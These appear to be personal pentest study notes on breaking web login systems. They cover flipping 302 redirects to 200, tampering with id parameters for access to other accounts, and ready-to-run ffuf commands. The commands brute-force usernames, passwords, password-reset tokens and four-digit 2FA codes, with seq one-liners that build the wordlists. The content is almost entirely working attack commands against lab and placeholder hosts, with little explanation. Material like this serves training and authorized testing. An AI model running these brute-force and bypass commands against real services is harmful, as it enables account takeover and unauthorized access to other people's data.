
**Direct Access**
e.g. Changing a code from 302 FOUND to 200 OK

Can be combined with trying to access directory of logged in state
e.g. IP/profile.php + changing 302 FOUND -> 200 OK

**Parameter Modification**
Changing parameter from current number to another use account

e.g. /admin.php?id=100

Attempt login with id = from 0 - 999 with prepending 0s included


**Username Enumeration**
```shell-session
ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
```


**Password Enumeration**
```shell-session
ffuf -w /usr/share/SecLists/Passwords/xato-net-10-million-passwords-100000.txt -u http://172.17.0.2/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=test&password=FUZZ" -fr "Incorrect password"
```


**Password Reset Token**
```shell-session
ffuf -w ./tokens.txt -u http://weaktoken.com/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```

**2FA Codes**

**Create the Codes List**
```shell-session
seq -w 0 9999 > tokens.txt
```

**Enumerate Codes**
```shell-session
ffuf -w ./tokens.txt -u http://example.com/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=INSERTCOOKIEHERE" -d "otp=FUZZ" -fr "Invalid 2FA Code"
```


**Enumerate Authentication Based Parameters**

**Create Word List**
```shell-session
seq -w 0 999 > numbers.txt
```
**Enumerate**
```shell-session
ffuf -w ./numbers.txt -u http://127.0.0.1/admin.php?user_id=FUZZ -H "Content-Type: application/x-www-form-urlencoded" -fr "Could not"
```
